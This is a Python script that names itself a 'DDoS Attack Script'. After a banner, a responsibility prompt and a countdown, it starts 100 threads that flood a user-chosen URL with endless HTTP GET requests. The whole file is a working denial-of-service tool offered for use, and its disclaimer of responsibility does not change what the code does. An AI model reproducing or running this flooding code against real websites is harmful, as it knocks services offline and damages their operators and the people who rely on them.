import requests
import threading
import time
import sys
from colorama import Fore, Style

def S_DOS():
    def print_banner():
        print(Fore.RED + "DDoS Attack Script" + Style.RESET_ALL)
        time.sleep(1)
        print(Fore.YELLOW + "This script will perform a DDoS attack on a specified URL." + Style.RESET_ALL)
        time.sleep(1)
        print(Fore.CYAN + "First set URL (line 33) and number of threads (line 36) in the script." + Style.RESET_ALL)
        time.sleep(2)
        print(Fore.MAGENTA + "You Can Add your url By typing (nano DDOS.py)" + Style.RESET_ALL)
        time.sleep(2)
        print(Fore.RED + "We are not responsible for any misuse of this tool." + Style.RESET_ALL)
    print_banner()
    agree = input(Fore.RED + "Do you agree to use this tool responsibly? (y/n): " + Style.RESET_ALL).lower()

    if agree != 'y':
        print(Fore.RED + "You must agree to use this tool responsibly. Exiting..." + Style.RESET_ALL)
        return

    print(Fore.GREEN + "Activating..." + Style.RESET_ALL)
    time.sleep(1)
    print(Fore.BLUE + "lunching in 5s..." + Style.RESET_ALL)
    
    for i in range(5, 0, -1):
        print(Fore.BLUE + f"[+] Countdown: {i}" + Style.RESET_ALL)
        time.sleep(1)
    print(Fore.BLUE + "Launching now..." + Style.RESET_ALL)
    time.sleep(1)
    
    # Target URL
    target_url = "http://example.com" # <-- Set your target URL here
    # Number of threads
    num_threads = 100 # <-- Set number of threads here

    # Function to send HTTP requests
    def ddos():
        while True:
            try:
                response = requests.get(target_url)
                print(f"Sent request to {target_url}, Status code: {response.status_code}")
            except requests.exceptions.RequestException as e:
                print(f"Request failed: {e}")

    # Create and start threads
    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=ddos)
        thread.start()
        threads.append(thread)

    # Keep the main thread alive
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Stopping DDoS attack...")
        for thread in threads:
            thread.join()

if __name__ == "__main__":
    S_DOS()